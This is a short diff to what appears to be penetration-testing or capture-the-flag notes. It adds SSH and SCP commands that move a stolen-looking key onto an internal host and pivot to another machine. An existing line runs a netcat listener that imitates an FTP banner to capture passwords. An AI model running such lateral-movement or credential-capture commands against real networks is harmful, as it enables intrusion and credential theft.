@@ -1,3 +1,10 @@
+ssh -i morgan.key morgan@172.16.0.252
+
+scp -i morgan.key ./dir.key morgan@172.16.0.252:/tmp
+
+ssh -i /tmp/dir.key remote@192.168.11.1
+
 ssh aengineer@192.168.10.1 -i remote.key
+
 python -c 'print "220 Welcome!\r\n331 Please specify the password"' | nc -nvlp 2020
 
